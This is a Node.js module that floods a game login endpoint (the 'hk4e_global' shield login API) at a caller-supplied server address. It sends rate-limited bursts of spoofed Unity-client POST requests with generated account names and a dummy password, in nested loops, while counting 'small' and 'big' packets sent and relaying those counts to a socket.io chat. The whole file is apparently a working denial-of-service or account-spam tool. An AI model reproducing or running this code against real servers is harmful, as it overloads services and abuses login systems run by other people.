const axios =  require('axios')
const rateLimit = require('axios-rate-limit')
const fs = require('fs')
var term = require( 'terminal-kit' ).terminal

const http = rateLimit(axios.create(), { maxRequests: 8, perMilliseconds: 1000, maxRPS: 8 })
let packetCount = 0
let myIo

var stat = []

async function makeAcc(userName, serverAddr, thisIo) {
  const options = {
    method: 'POST',
    url: `https://${serverAddr}/hk4e_global/mdk/shield/api/login`,
    headers: {
      Host: serverAddr,
      'User-Agent': 'UnityPlayer/2017.4.30f1 (UnityWebRequest/1.0, libcurl/7.51.0-DEV)',
      Accept: '*/*',
      'Accept-Encoding': 'identity',
      'Content-Type': 'application/json',
      'x-rpc-client_type': '3',
      'x-rpc-sys_version': 'a',
      'x-rpc-device_id': 'a',
      'x-rpc-device_model': 'a',
      'x-rpc-device_name': 'a',
      'x-rpc-mdk_version': '1.30.0.0',
      'x-rpc-channel_version': '1.30.0.0',
      'x-rpc-channel_id': '1',
      'x-rpc-sub_channel_id': '0',
      'x-rpc-language': 'en',
      'x-rpc-game_biz': 'hk4e_global',
      'x-rpc-risky': 'id=none;c=;s=;v=',
      'X-Unity-Version': '2017.4.30f1'
    },
    data: {
      account: userName,
      password: 'a',
      is_crypto: true
    },
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
  };

  await http.request(options).then(res => {
    if (res.data.message === 'OK') {
      let formatedString = `[Small] Success id: ${userName} uid: ${res.data.data.account.uid}`
      console.log(formatedString)
      thisIo.emit('chat message', formatedString)
      packetCount += 1

      //update stat
      for (let i = 0; i < stat.length; i++) {
        const element = stat[i];
        if (element.serverName == serverAddr) {
            element.smallSent = element.smallSent + 1
        }
      }

      printServerStat()

      return true
    } else {
      console.log(`[Small] error not OK`)
    }
  }).catch(err => {
    console.log(err.message)
  })
}

// i high
async function sendSmall(randString, serverAddr, highAmount, io) {
    myIo = io

    //stat stuff
    let isExist = isStatExist(serverAddr)
    if (!isExist) {
        addServerToStat(serverAddr)
    }

    for (let i = 0; i < highAmount; i++) {
        let userName = randString + (Math.floor(Date.now() / 1)).toString() + i.toString()
        let isOk = makeAcc(userName, serverAddr, io)
    }
    return true
}

// i low
async function sendSmallPacket(randString, serverAddr, lowAmount, highAmount, io) {
    myIo = io
    console.log('SMALL: Sending Small Packet')
    for (let i = 0; i < lowAmount; i++) {
        await sendSmall(randString + i.toString(), serverAddr, highAmount, io);
    }
}


// Single
async function singleSmall(serverAddr, io) {
    myIo = io

    //stat stuff
    let isExist = isStatExist(serverAddr)
    if (!isExist) {
        addServerToStat(serverAddr)
    }
    let isOk = await makeAcc(Date.now().toString, serverAddr, io)
}


function isStatExist(serverAddr) {
  let selectedServer = stat.filter((srv) => {
      return srv.serverName == serverAddr
  })

  if (selectedServer.length > 0) {
      console.log(`${serverAddr} exist`)
      return true
  } else {
      console.log(`${serverAddr} is not exist`)
      return false
  }
}


// add new server to stat
function addServerToStat(serverAddr) {
  let isExist = isStatExist(serverAddr)
  if (isExist) {
      return false
  }

  let newServer = {
      serverName: serverAddr,
      smallSent: 0,
      bigSent: 0,
      bigSize: 0.0
  }

  console.log(`${serverAddr} added`)

  stat.push(newServer)
  return true
}


// get server stat
function printServerStat() {
  stat.forEach((srv) => {
      let now = new Date()
      let formatedString = `[Small] Srv: ${srv.serverName} | Small: ${srv.smallSent} | Big: ${srv.bigSize.toFixed(3)}GB | At: | ${now.getHours()}:${now.getMinutes()}`
      console.log(formatedString)
      myIo.emit('chat message', formatedString)
  })
}



module.exports = {
    sendSmallPacket,
    singleSmall
}
